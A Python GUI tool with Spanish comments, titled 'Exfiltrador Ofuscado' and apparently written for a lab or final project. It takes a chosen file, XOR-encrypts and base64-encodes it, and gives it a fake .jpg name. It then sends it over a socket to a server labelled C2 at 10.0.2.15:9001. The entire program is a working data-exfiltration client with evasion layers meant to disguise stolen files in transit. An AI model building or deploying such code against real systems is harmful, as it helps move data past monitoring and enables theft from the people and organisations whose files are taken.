import base64
import hashlib
import os
import socket
import struct
import tkinter as tk
from tkinter import filedialog, messagebox

C2_HOST = "10.0.2.15"
C2_PORT = 9001
XOR_KEY = 0x42


def send_string(sock, text):
  data = text.encode("utf-8")
  sock.sendall(struct.pack("!I", len(data)))
  sock.sendall(data)


def xor_bytes(data, key):
  """Aplica una capa de cifrado XOR simple a nivel de bytes."""
  return bytes([b ^ key for b in data])


def calculate_sha256(path):
  sha256 = hashlib.sha256()
  with open(path, "rb") as f:
    while True:
      chunk = f.read(65536)
      if not chunk:
        break
      sha256.update(chunk)
  return sha256.hexdigest()


def send_file():
  file_path = filedialog.askopenfilename(
      title="Seleccionar archivo para el laboratorio"
  )

  if not file_path:
    return

  original_filename = os.path.basename(file_path)
  filesize = os.path.getsize(file_path)

  try:
    # ── 1. Procesamiento local del archivo (Capas de ofuscación) ────
    with open(file_path, "rb") as f:
      original_data = f.read()

    # Capa 1: XOR con clave 0x42
    xored_data = xor_bytes(original_data, XOR_KEY)

    # Capa 2: Base64 sobre el dato XOR'd
    payload_data = base64.b64encode(xored_data)
    payload_size = len(payload_data)

    # Capa 3: Extension spoofing — simula ser .jpg en lugar de la extensión original
    spoofed_name = os.path.splitext(original_filename)[0] + ".jpg"

    # ── 2. Conexión y transmisión al servidor C2 ────────────────────
    with socket.create_connection((C2_HOST, C2_PORT), timeout=10) as sock:
      # Comunicación inicial
      send_string(sock, "HELLO")

      # Información del archivo (enviando el nombre falseado y el tamaño del payload procesado)
      send_string(sock, spoofed_name)
      sock.sendall(struct.pack("!Q", payload_size))

      response = sock.recv(5)
      if response != b"READY":
        raise Exception("El servidor no autorizó la transferencia.")

      # Transferencia del payload cifrado/codificado por bloques
      chunk_size = 65536
      for i in range(0, payload_size, chunk_size):
        chunk = payload_data[i : i + chunk_size]
        sock.sendall(chunk)

      response = sock.recv(8)

      if response == b"RECEIVED":
        file_hash = calculate_sha256(file_path)

        messagebox.showinfo(
            "Transferencia completada",
            f"Archivo original: {original_filename}\n"
            f"Nombre anunciado (Spoofing): {spoofed_name}\n"
            f"Tamaño original: {filesize} bytes\n"
            f"Tamaño payload (Base64): {payload_size} bytes\n\n"
            f"SHA-256 (Original):\n{file_hash}",
        )
      else:
        messagebox.showwarning(
            "Advertencia", "El servidor no confirmó la recepción."
        )

  except Exception as e:
    messagebox.showerror("Error de conexión", str(e))


# ── Interfaz gráfica ──────────────────────────────────────────────
root = tk.Tk()
root.title("File Transfer para proyecto final")
root.geometry("420x220")
root.resizable(False, False)

title = tk.Label(root, text="Exfiltrador Ofuscado", font=("Arial", 16, "bold"))
title.pack(pady=25)

description = tk.Label(
    root,
    text=(
        "Seleccione un archivo para aplicar capas\nde cifrado y enviarlo al"
        " laboratorio."
    ),
)
description.pack(pady=5)

button = tk.Button(
    root,
    text="Seleccionar y exfiltrar archivo",
    command=send_file,
    width=30,
    height=2,
)
button.pack(pady=20)

root.mainloop()